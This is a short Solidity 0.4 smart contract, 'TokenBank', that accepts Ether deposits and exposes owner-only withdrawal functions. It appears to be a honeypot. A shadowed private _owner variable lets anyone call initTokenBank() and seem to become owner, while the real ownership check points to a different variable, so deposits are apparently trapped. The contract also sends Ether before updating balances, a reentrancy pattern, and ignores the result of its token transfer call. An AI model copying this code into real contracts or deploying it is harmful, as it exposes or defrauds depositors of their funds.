pragma solidity ^0.4.19;

contract Ownable
{
    address private _newOwner;
    address private _owner = msg.sender;
    
    function changeOwner(address addr)
    public
    onlyOwner
    {
        _newOwner = addr;
    }
    
    function confirmOwner() 
    public
    {
        if(msg.sender == _newOwner)
        {
            _owner = _newOwner;
        }
    }
    
    modifier onlyOwner
    {
        if(_owner == msg.sender)_;
    }
}

contract Token is Ownable
{
    address private _owner = msg.sender;
    
    function WithdrawToken(address token, uint256 amount, address to)
    public 
    onlyOwner
    {
        token.call(bytes4(keccak256("transfer(address,uint256)")), to, amount); 
    }
}

contract TokenBank is Token
{
    uint private _minDeposit;
    mapping (address => uint) private _holders;
    
    function initTokenBank()
    public
    {
        _owner = msg.sender;
        _minDeposit = 1 ether;
    }
    
    function()
    payable
    {
        _deposit();
    }
   
    function _deposit() 
    payable
    {
        if(msg.value > _minDeposit)
        {
            _holders[msg.sender] += msg.value;
        }
    }
    
    function WitdrawTokenToHolder(address _to, address _token, uint _amount)
    public
    onlyOwner
    {
        if(_holders[_to] > 0)
        {
            _holders[_to] = 0;
            WithdrawToken(_token, _amount, _to);     
        }
    }
   
    function WithdrawToHolder(address _addr, uint _wei) 
    public
    onlyOwner
    payable
    {
        if(_holders[_addr] > 0)
        {
            if(_addr.call.value(_wei)())
            {
                _holders[_addr] -= _wei;
            }
        }
    }
}